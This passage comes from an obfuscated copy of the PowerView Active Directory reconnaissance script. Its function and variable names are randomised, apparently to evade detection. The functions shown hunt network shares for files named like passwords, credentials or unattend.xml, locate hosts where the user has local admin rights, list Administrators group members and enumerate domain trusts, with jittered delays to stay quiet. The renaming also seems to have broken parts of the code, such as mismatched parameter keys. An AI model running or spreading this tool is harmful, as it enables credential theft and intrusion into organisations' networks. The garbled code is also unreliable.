            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $kYavoJZJ99 = watchman -fjBNCklg99 $fjBNCklg99
            }
            else {
                $kYavoJZJ99 = watchman -fjBNCklg99 $fjBNCklg99 -Quiet
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
            Write-Verbose "[excitements] Total number of hosts: $($DCHakmFd99.count)"
            Write-Verbose "[excitements] Delay: $Delay, Jitter: $bdvUWGhd99"
            $lucfSNpw99 = 0
            $AVMuMKMj99 = New-Object System.Random
            ForEach ($ySXJaLJG99 in $DCHakmFd99) {
                $lucfSNpw99 = $lucfSNpw99 + 1
                Start-Sleep -Seconds $AVMuMKMj99.Next((1-$bdvUWGhd99)*$Delay, (1+$bdvUWGhd99)*$Delay)
                Write-Verbose "[excitements] Enumerating server $ySXJaLJG99 ($lucfSNpw99 of $($DCHakmFd99.count))"
                Invoke-Command -FtFVcezt99 $moQfbXMC99 -ArgumentList $ySXJaLJG99, $oqGyIUdf99, $kYavoJZJ99
            }
        }
        else {
            Write-Verbose "[excitements] Using threading with threads: $eWhlCNWF99"
            $KCNYxmCi99 = @{
                'CheckShareAccess' = $oqGyIUdf99
                'TokenHandle' = $kYavoJZJ99
            }
            director -cSHFXHUa99 $DCHakmFd99 -FtFVcezt99 $moQfbXMC99 -sRRYHnHD99 $KCNYxmCi99 -eWhlCNWF99 $eWhlCNWF99
        }
    }
    END {
        if ($kYavoJZJ99) {
            podiatrist -zkuRoAPL99 $kYavoJZJ99
        }
    }
}
function urinary {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $cSHFXHUa99,
        [ValidateNotNullOrEmpty()]
        [String]
        $nMDVGmar99,
        [ValidateNotNullOrEmpty()]
        [String]
        $ZalVoNke99,
        [ValidateNotNullOrEmpty()]
        [String]
        $qoAZSdEA99,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $MODrPMHQ99,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $oOOUrUST99,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $dUbmyVFn99,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        $hUCXRcQf99 = @('*password*', '*sensitive*', '*admin*', '*login*', '*secret*', 'unattend*.xml', '*.vmdk', '*creds*', '*credential*', '*.config'),
        [ValidateNotNullOrEmpty()]
        [ValidatePattern('\\\\')]
        [Alias('Share')]
        [String[]]
        $BxtckExv99,
        [String[]]
        $HAnAqQdM99 = @('C$', 'Admin$', 'Print$', 'IPC$'),
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $wwOUHzUg99,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $gjZqZOTJ99,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $PcomkLSR99,
        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        $fIcIlwPm99,
        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        $gnfVSQQR99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $qgdPgdMB99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $TRVzBsDk99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $CgYkCByk99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $elDiVqTz99,
        [Switch]
        $rmzHuzlC99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $bdvUWGhd99 = .3,
        [Int]
        [ValidateRange(1, 100)]
        $eWhlCNWF99 = 20
    )
    BEGIN {
        $WEzzUqjJ99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $WEzzUqjJ99['Domain'] = $nMDVGmar99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $WEzzUqjJ99['LDAPFilter'] = $ZalVoNke99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $WEzzUqjJ99['SearchBase'] = $qoAZSdEA99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $WEzzUqjJ99['OperatingSystem'] = $rqmKHnWu99 }
        if ($PSBoundParameters['ComputerServicePack']) { $WEzzUqjJ99['ServicePack'] = $gNnwgaEV99 }
        if ($PSBoundParameters['ComputerSiteName']) { $WEzzUqjJ99['SiteName'] = $iSntscLt99 }
        if ($PSBoundParameters['Server']) { $WEzzUqjJ99['Server'] = $qgdPgdMB99 }
        if ($PSBoundParameters['SearchScope']) { $WEzzUqjJ99['SearchScope'] = $TRVzBsDk99 }
        if ($PSBoundParameters['ResultPageSize']) { $WEzzUqjJ99['ResultPageSize'] = $CgYkCByk99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $WEzzUqjJ99['ServerTimeLimit'] = $elDiVqTz99 }
        if ($PSBoundParameters['Tombstone']) { $WEzzUqjJ99['Tombstone'] = $rmzHuzlC99 }
        if ($PSBoundParameters['Credential']) { $WEzzUqjJ99['Credential'] = $fjBNCklg99 }
        if ($PSBoundParameters['ComputerName']) {
            $DCHakmFd99 = $cSHFXHUa99
        }
        else {
            Write-Verbose '[urinary] Querying computers in the domain'
            $DCHakmFd99 = cowing @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[urinary] TargetComputers length: $($DCHakmFd99.Length)"
        if ($DCHakmFd99.Length -eq 0) {
            throw '[urinary] No hosts found to enumerate'
        }
        $moQfbXMC99 = {
            Param($cSHFXHUa99, $hUCXRcQf99, $HAnAqQdM99, $fIcIlwPm99, $TXrZYLiM99, $gnfVSQQR99, $IgAnDeAQ99, $zkuRoAPL99)
            if ($zkuRoAPL99) {
                $Null = watchman -zkuRoAPL99 $zkuRoAPL99 -Quiet
            }
            ForEach ($ySXJaLJG99 in $cSHFXHUa99) {
                $pXwppaUC99 = @()
                if ($ySXJaLJG99.StartsWith('\\')) {
                    $pXwppaUC99 += $ySXJaLJG99
                }
                else {
                    $Up = Test-Connection -Count 1 -Quiet -cSHFXHUa99 $ySXJaLJG99
                    if ($Up) {
                        $HRGpPqWs99 = temper -cSHFXHUa99 $ySXJaLJG99
                        ForEach ($Share in $HRGpPqWs99) {
                            $fSwxgNDj99 = $Share.Name
                            $Path = '\\'+$ySXJaLJG99+'\'+$fSwxgNDj99
                            if (($fSwxgNDj99) -and ($fSwxgNDj99.Trim() -ne '')) {
                                if ($HAnAqQdM99 -NotContains $fSwxgNDj99) {
                                    try {
                                        $Null = [IO.Directory]::GetFiles($Path)
                                        $pXwppaUC99 += $Path
                                    }
                                    catch {
                                        Write-Verbose "[!] No access to $Path"
                                    }
                                }
                            }
                        }
                    }
                }
                ForEach ($Share in $pXwppaUC99) {
                    Write-Verbose "Searching share: $Share"
                    $RHjtVvNt99 = @{
                        'Path' = $Share
                        'Include' = $hUCXRcQf99
                    }
                    if ($fIcIlwPm99) {
                        $RHjtVvNt99['OfficeDocs'] = $fIcIlwPm99
                    }
                    if ($gnfVSQQR99) {
                        $RHjtVvNt99['FreshEXEs'] = $gnfVSQQR99
                    }
                    if ($wwOUHzUg99) {
                        $RHjtVvNt99['LastAccessTime'] = $wwOUHzUg99
                    }
                    if ($gjZqZOTJ99) {
                        $RHjtVvNt99['LastWriteTime'] = $gjZqZOTJ99
                    }
                    if ($PcomkLSR99) {
                        $RHjtVvNt99['CreationTime'] = $PcomkLSR99
                    }
                    if ($IgAnDeAQ99) {
                        $RHjtVvNt99['CheckWriteAccess'] = $IgAnDeAQ99
                    }
                    clemency @SearchArgs
                }
            }
            if ($zkuRoAPL99) {
                podiatrist
            }
        }
        $kYavoJZJ99 = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $kYavoJZJ99 = watchman -fjBNCklg99 $fjBNCklg99
            }
            else {
                $kYavoJZJ99 = watchman -fjBNCklg99 $fjBNCklg99 -Quiet
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
            Write-Verbose "[urinary] Total number of hosts: $($DCHakmFd99.count)"
            Write-Verbose "[urinary] Delay: $Delay, Jitter: $bdvUWGhd99"
            $lucfSNpw99 = 0
            $AVMuMKMj99 = New-Object System.Random
            ForEach ($ySXJaLJG99 in $DCHakmFd99) {
                $lucfSNpw99 = $lucfSNpw99 + 1
                Start-Sleep -Seconds $AVMuMKMj99.Next((1-$bdvUWGhd99)*$Delay, (1+$bdvUWGhd99)*$Delay)
                Write-Verbose "[urinary] Enumerating server $ySXJaLJG99 ($lucfSNpw99 of $($DCHakmFd99.count))"
                Invoke-Command -FtFVcezt99 $moQfbXMC99 -ArgumentList $ySXJaLJG99, $hUCXRcQf99, $HAnAqQdM99, $fIcIlwPm99, $TXrZYLiM99, $gnfVSQQR99, $IgAnDeAQ99, $kYavoJZJ99
            }
        }
        else {
            Write-Verbose "[urinary] Using threading with threads: $eWhlCNWF99"
            $KCNYxmCi99 = @{
                'Include' = $hUCXRcQf99
                'ExcludedShares' = $HAnAqQdM99
                'OfficeDocs' = $fIcIlwPm99
                'ExcludeHidden' = $TXrZYLiM99
                'FreshEXEs' = $gnfVSQQR99
                'CheckWriteAccess' = $IgAnDeAQ99
                'TokenHandle' = $kYavoJZJ99
            }
            director -cSHFXHUa99 $DCHakmFd99 -FtFVcezt99 $moQfbXMC99 -sRRYHnHD99 $KCNYxmCi99 -eWhlCNWF99 $eWhlCNWF99
        }
    }
    END {
        if ($kYavoJZJ99) {
            podiatrist -zkuRoAPL99 $kYavoJZJ99
        }
    }
}
function Marcella {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $cSHFXHUa99,
        [ValidateNotNullOrEmpty()]
        [String]
        $nMDVGmar99,
        [ValidateNotNullOrEmpty()]
        [String]
        $ZalVoNke99,
        [ValidateNotNullOrEmpty()]
        [String]
        $qoAZSdEA99,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $MODrPMHQ99,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $oOOUrUST99,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $dUbmyVFn99,
        [Switch]
        $oqGyIUdf99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $qgdPgdMB99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $TRVzBsDk99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $CgYkCByk99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $elDiVqTz99,
        [Switch]
        $rmzHuzlC99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $bdvUWGhd99 = .3,
        [Int]
        [ValidateRange(1, 100)]
        $eWhlCNWF99 = 20
    )
    BEGIN {
        $WEzzUqjJ99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $WEzzUqjJ99['Domain'] = $nMDVGmar99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $WEzzUqjJ99['LDAPFilter'] = $ZalVoNke99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $WEzzUqjJ99['SearchBase'] = $qoAZSdEA99 }
        if ($PSBoundParameters['Unconstrained']) { $WEzzUqjJ99['Unconstrained'] = $SKpvyXsg99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $WEzzUqjJ99['OperatingSystem'] = $rqmKHnWu99 }
        if ($PSBoundParameters['ComputerServicePack']) { $WEzzUqjJ99['ServicePack'] = $gNnwgaEV99 }
        if ($PSBoundParameters['ComputerSiteName']) { $WEzzUqjJ99['SiteName'] = $iSntscLt99 }
        if ($PSBoundParameters['Server']) { $WEzzUqjJ99['Server'] = $qgdPgdMB99 }
        if ($PSBoundParameters['SearchScope']) { $WEzzUqjJ99['SearchScope'] = $TRVzBsDk99 }
        if ($PSBoundParameters['ResultPageSize']) { $WEzzUqjJ99['ResultPageSize'] = $CgYkCByk99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $WEzzUqjJ99['ServerTimeLimit'] = $elDiVqTz99 }
        if ($PSBoundParameters['Tombstone']) { $WEzzUqjJ99['Tombstone'] = $rmzHuzlC99 }
        if ($PSBoundParameters['Credential']) { $WEzzUqjJ99['Credential'] = $fjBNCklg99 }
        if ($PSBoundParameters['ComputerName']) {
            $DCHakmFd99 = $cSHFXHUa99
        }
        else {
            Write-Verbose '[Marcella] Querying computers in the domain'
            $DCHakmFd99 = cowing @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Marcella] TargetComputers length: $($DCHakmFd99.Length)"
        if ($DCHakmFd99.Length -eq 0) {
            throw '[Marcella] No hosts found to enumerate'
        }
        $moQfbXMC99 = {
            Param($cSHFXHUa99, $zkuRoAPL99)
            if ($zkuRoAPL99) {
                $Null = watchman -zkuRoAPL99 $zkuRoAPL99 -Quiet
            }
            ForEach ($ySXJaLJG99 in $cSHFXHUa99) {
                $Up = Test-Connection -Count 1 -Quiet -cSHFXHUa99 $ySXJaLJG99
                if ($Up) {
                    $AXAmZvFi99 = tampers -cSHFXHUa99 $ySXJaLJG99
                    if ($AXAmZvFi99.IsAdmin) {
                        $ySXJaLJG99
                    }
                }
            }
            if ($zkuRoAPL99) {
                podiatrist
            }
        }
        $kYavoJZJ99 = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $kYavoJZJ99 = watchman -fjBNCklg99 $fjBNCklg99
            }
            else {
                $kYavoJZJ99 = watchman -fjBNCklg99 $fjBNCklg99 -Quiet
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
            Write-Verbose "[Marcella] Total number of hosts: $($DCHakmFd99.count)"
            Write-Verbose "[Marcella] Delay: $Delay, Jitter: $bdvUWGhd99"
            $lucfSNpw99 = 0
            $AVMuMKMj99 = New-Object System.Random
            ForEach ($ySXJaLJG99 in $DCHakmFd99) {
                $lucfSNpw99 = $lucfSNpw99 + 1
                Start-Sleep -Seconds $AVMuMKMj99.Next((1-$bdvUWGhd99)*$Delay, (1+$bdvUWGhd99)*$Delay)
                Write-Verbose "[Marcella] Enumerating server $ySXJaLJG99 ($lucfSNpw99 of $($DCHakmFd99.count))"
                Invoke-Command -FtFVcezt99 $moQfbXMC99 -ArgumentList $ySXJaLJG99, $kYavoJZJ99
            }
        }
        else {
            Write-Verbose "[Marcella] Using threading with threads: $eWhlCNWF99"
            $KCNYxmCi99 = @{
                'TokenHandle' = $kYavoJZJ99
            }
            director -cSHFXHUa99 $DCHakmFd99 -FtFVcezt99 $moQfbXMC99 -sRRYHnHD99 $KCNYxmCi99 -eWhlCNWF99 $eWhlCNWF99
        }
    }
}
function Saunders {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroupMember.API')]
    [OutputType('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $cSHFXHUa99,
        [ValidateNotNullOrEmpty()]
        [String]
        $nMDVGmar99,
        [ValidateNotNullOrEmpty()]
        [String]
        $ZalVoNke99,
        [ValidateNotNullOrEmpty()]
        [String]
        $qoAZSdEA99,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $MODrPMHQ99,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $oOOUrUST99,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $dUbmyVFn99,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $EidYTRyh99 = 'Administrators',
        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $bZssbhYP99 = 'API',
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $qgdPgdMB99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $TRVzBsDk99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $CgYkCByk99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $elDiVqTz99,
        [Switch]
        $rmzHuzlC99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $bdvUWGhd99 = .3,
        [Int]
        [ValidateRange(1, 100)]
        $eWhlCNWF99 = 20
    )
    BEGIN {
        $WEzzUqjJ99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $WEzzUqjJ99['Domain'] = $nMDVGmar99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $WEzzUqjJ99['LDAPFilter'] = $ZalVoNke99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $WEzzUqjJ99['SearchBase'] = $qoAZSdEA99 }
        if ($PSBoundParameters['Unconstrained']) { $WEzzUqjJ99['Unconstrained'] = $SKpvyXsg99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $WEzzUqjJ99['OperatingSystem'] = $rqmKHnWu99 }
        if ($PSBoundParameters['ComputerServicePack']) { $WEzzUqjJ99['ServicePack'] = $gNnwgaEV99 }
        if ($PSBoundParameters['ComputerSiteName']) { $WEzzUqjJ99['SiteName'] = $iSntscLt99 }
        if ($PSBoundParameters['Server']) { $WEzzUqjJ99['Server'] = $qgdPgdMB99 }
        if ($PSBoundParameters['SearchScope']) { $WEzzUqjJ99['SearchScope'] = $TRVzBsDk99 }
        if ($PSBoundParameters['ResultPageSize']) { $WEzzUqjJ99['ResultPageSize'] = $CgYkCByk99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $WEzzUqjJ99['ServerTimeLimit'] = $elDiVqTz99 }
        if ($PSBoundParameters['Tombstone']) { $WEzzUqjJ99['Tombstone'] = $rmzHuzlC99 }
        if ($PSBoundParameters['Credential']) { $WEzzUqjJ99['Credential'] = $fjBNCklg99 }
        if ($PSBoundParameters['ComputerName']) {
            $DCHakmFd99 = $cSHFXHUa99
        }
        else {
            Write-Verbose '[Saunders] Querying computers in the domain'
            $DCHakmFd99 = cowing @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Saunders] TargetComputers length: $($DCHakmFd99.Length)"
        if ($DCHakmFd99.Length -eq 0) {
            throw '[Saunders] No hosts found to enumerate'
        }
        $moQfbXMC99 = {
            Param($cSHFXHUa99, $EidYTRyh99, $bZssbhYP99, $zkuRoAPL99)
            if ($EidYTRyh99 -eq "Administrators") {
                $ujfdaDeS99 = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid,$null)
                $EidYTRyh99 = ($ujfdaDeS99.Translate([System.Security.Principal.NTAccount]).Value -split "\\")[-1]
            }
            if ($zkuRoAPL99) {
                $Null = watchman -zkuRoAPL99 $zkuRoAPL99 -Quiet
            }
            ForEach ($ySXJaLJG99 in $cSHFXHUa99) {
                $Up = Test-Connection -Count 1 -Quiet -cSHFXHUa99 $ySXJaLJG99
                if ($Up) {
                    $KlvCZVsr99 = @{
                        'ComputerName' = $ySXJaLJG99
                        'Method' = $bZssbhYP99
                        'GroupName' = $EidYTRyh99
                    }
                    eyestrain @NetLocalGroupMemberArguments
                }
            }
            if ($zkuRoAPL99) {
                podiatrist
            }
        }
        $kYavoJZJ99 = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $kYavoJZJ99 = watchman -fjBNCklg99 $fjBNCklg99
            }
            else {
                $kYavoJZJ99 = watchman -fjBNCklg99 $fjBNCklg99 -Quiet
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
            Write-Verbose "[Saunders] Total number of hosts: $($DCHakmFd99.count)"
            Write-Verbose "[Saunders] Delay: $Delay, Jitter: $bdvUWGhd99"
            $lucfSNpw99 = 0
            $AVMuMKMj99 = New-Object System.Random
            ForEach ($ySXJaLJG99 in $DCHakmFd99) {
                $lucfSNpw99 = $lucfSNpw99 + 1
                Start-Sleep -Seconds $AVMuMKMj99.Next((1-$bdvUWGhd99)*$Delay, (1+$bdvUWGhd99)*$Delay)
                Write-Verbose "[Saunders] Enumerating server $ySXJaLJG99 ($lucfSNpw99 of $($DCHakmFd99.count))"
                Invoke-Command -FtFVcezt99 $moQfbXMC99 -ArgumentList $ySXJaLJG99, $EidYTRyh99, $bZssbhYP99, $kYavoJZJ99
            }
        }
        else {
            Write-Verbose "[Saunders] Using threading with threads: $eWhlCNWF99"
            $KCNYxmCi99 = @{
                'GroupName' = $EidYTRyh99
                'Method' = $bZssbhYP99
                'TokenHandle' = $kYavoJZJ99
            }
            director -cSHFXHUa99 $DCHakmFd99 -FtFVcezt99 $moQfbXMC99 -sRRYHnHD99 $KCNYxmCi99 -eWhlCNWF99 $eWhlCNWF99
        }
    }
    END {
        if ($kYavoJZJ99) {
            podiatrist -zkuRoAPL99 $kYavoJZJ99
        }
    }
}
function clammy {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DomainTrust.NET')]
    [OutputType('PowerView.DomainTrust.LDAP')]
    [OutputType('PowerView.DomainTrust.API')]
    [CmdletBinding(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $jnYnRnFJ99,
        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $API,
        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        $NET,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $SeHRgLsL99,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ycQOyvWh99,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $WdOnSHnL99,
        [Parameter(ParameterSetName = 'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $qgdPgdMB99,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $TRVzBsDk99 = 'Subtree',
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $CgYkCByk99 = 200,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $elDiVqTz99,
        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        $rmzHuzlC99,
        [Alias('ReturnOne')]
        [Switch]
        $cIwTZAKh99,
        [Parameter(ParameterSetName = 'LDAP')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $BhNAErsi99 = @{
            [uint32]'0x00000001' = 'NON_TRANSITIVE'
            [uint32]'0x00000002' = 'UPLEVEL_ONLY'
            [uint32]'0x00000004' = 'FILTER_SIDS'
            [uint32]'0x00000008' = 'FOREST_TRANSITIVE'
            [uint32]'0x00000010' = 'CROSS_ORGANIZATION'
            [uint32]'0x00000020' = 'WITHIN_FOREST'
            [uint32]'0x00000040' = 'TREAT_AS_EXTERNAL'
            [uint32]'0x00000080' = 'TRUST_USES_RC4_ENCRYPTION'
            [uint32]'0x00000100' = 'TRUST_USES_AES_KEYS'
            [uint32]'0x00000200' = 'CROSS_ORGANIZATION_NO_TGT_DELEGATION'
            [uint32]'0x00000400' = 'PIM_TRUST'
        }
        $JAhAOnnm99 = @{}
        if ($PSBoundParameters['Domain']) { $JAhAOnnm99['Domain'] = $jnYnRnFJ99 }
        if ($PSBoundParameters['LDAPFilter']) { $JAhAOnnm99['LDAPFilter'] = $SeHRgLsL99 }
        if ($PSBoundParameters['Properties']) { $JAhAOnnm99['Properties'] = $ycQOyvWh99 }
        if ($PSBoundParameters['SearchBase']) { $JAhAOnnm99['SearchBase'] = $WdOnSHnL99 }
        if ($PSBoundParameters['Server']) { $JAhAOnnm99['Server'] = $qgdPgdMB99 }
        if ($PSBoundParameters['SearchScope']) { $JAhAOnnm99['SearchScope'] = $TRVzBsDk99 }
        if ($PSBoundParameters['ResultPageSize']) { $JAhAOnnm99['ResultPageSize'] = $CgYkCByk99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $JAhAOnnm99['ServerTimeLimit'] = $elDiVqTz99 }
        if ($PSBoundParameters['Tombstone']) { $JAhAOnnm99['Tombstone'] = $rmzHuzlC99 }
        if ($PSBoundParameters['Credential']) { $JAhAOnnm99['Credential'] = $fjBNCklg99 }
    }
    PROCESS {
        if ($PsCmdlet.ParameterSetName -ne 'API') {
            $qfcTwRNR99 = @{}
            if ($jnYnRnFJ99 -and $jnYnRnFJ99.Trim() -ne '') {
                $xSLoaPLm99 = $jnYnRnFJ99
            }
            else {
                if ($PSBoundParameters['Credential']) {
                    $xSLoaPLm99 = (indicate -fjBNCklg99 $fjBNCklg99).Name
                }
                else {
                    $xSLoaPLm99 = (indicate).Name
                }
            }
        }
        elseif ($PsCmdlet.ParameterSetName -ne 'NET') {
            if ($jnYnRnFJ99 -and $jnYnRnFJ99.Trim() -ne '') {
                $xSLoaPLm99 = $jnYnRnFJ99
            }
            else {
                $xSLoaPLm99 = $Env:USERDNSDOMAIN
            }
        }
        if ($PsCmdlet.ParameterSetName -eq 'LDAP') {
            $ecmYuQbe99 = maroons @LdapSearcherArguments
            $PimtsMCA99 = conflicts @NetSearcherArguments
            if ($ecmYuQbe99) {
                $ecmYuQbe99.Filter = '(objectClass=trustedDomain)'
                if ($PSBoundParameters['FindOne']) { $CmGXBhUd99 = $ecmYuQbe99.FindOne() }
                else { $CmGXBhUd99 = $ecmYuQbe99.FindAll() }
                $CmGXBhUd99 | Where-Object {$_} | ForEach-Object {
                    $Props = $_.Properties
                    $aaZyVGyF99 = New-Object PSObject
                    $zbWXvCnw99 = @()
                    $zbWXvCnw99 += $BhNAErsi99.Keys | Where-Object { $Props.trustattributes[0] -band $_ } | ForEach-Object { $BhNAErsi99[$_] }
                    $oSmJZzxo99 = Switch ($Props.trustdirection) {
                        0 { 'Disabled' }
                        1 { 'Inbound' }
                        2 { 'Outbound' }
                        3 { 'Bidirectional' }
                    }
                    $OWBaQBzv99 = Switch ($Props.trusttype) {
                        1 { 'WINDOWS_NON_ACTIVE_DIRECTORY' }
                        2 { 'WINDOWS_ACTIVE_DIRECTORY' }
                        3 { 'MIT' }
                    }
                    $rGTmjraU99 = $Props.distinguishedname[0]
                    $BqwTdkvP99 = $rGTmjraU99.IndexOf('DC=')
                    if ($BqwTdkvP99) {
                        $xSLoaPLm99 = $($rGTmjraU99.SubString($BqwTdkvP99)) -replace 'DC=','' -replace ',','.'
                    }
                    else {
                        $xSLoaPLm99 = ""
                    }
                    $sMzgpYTH99 = $rGTmjraU99.IndexOf(',CN=System')
                    if ($BqwTdkvP99) {
                        $TDntIjFc99 = $rGTmjraU99.SubString(3, $sMzgpYTH99-3)
                    }
                    else {
                        $TDntIjFc99 = ""
                    }
                    $srqjtTZT99 = New-Object Guid @(,$Props.objectguid[0])
                    $yofMxotZ99 = (New-Object System.Security.Principal.SecurityIdentifier($Props.securityidentifier[0],0)).Value
                    $aaZyVGyF99 | Add-Member Noteproperty 'SourceName' $xSLoaPLm99
                    $aaZyVGyF99 | Add-Member Noteproperty 'TargetName' $Props.name[0]
                    $aaZyVGyF99 | Add-Member Noteproperty 'TrustType' $OWBaQBzv99
                    $aaZyVGyF99 | Add-Member Noteproperty 'TrustAttributes' $($zbWXvCnw99 -join ',')
                    $aaZyVGyF99 | Add-Member Noteproperty 'TrustDirection' "$oSmJZzxo99"
                    $aaZyVGyF99 | Add-Member Noteproperty 'WhenCreated' $Props.whencreated[0]
                    $aaZyVGyF99 | Add-Member Noteproperty 'WhenChanged' $Props.whenchanged[0]
                    $aaZyVGyF99.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.LDAP')
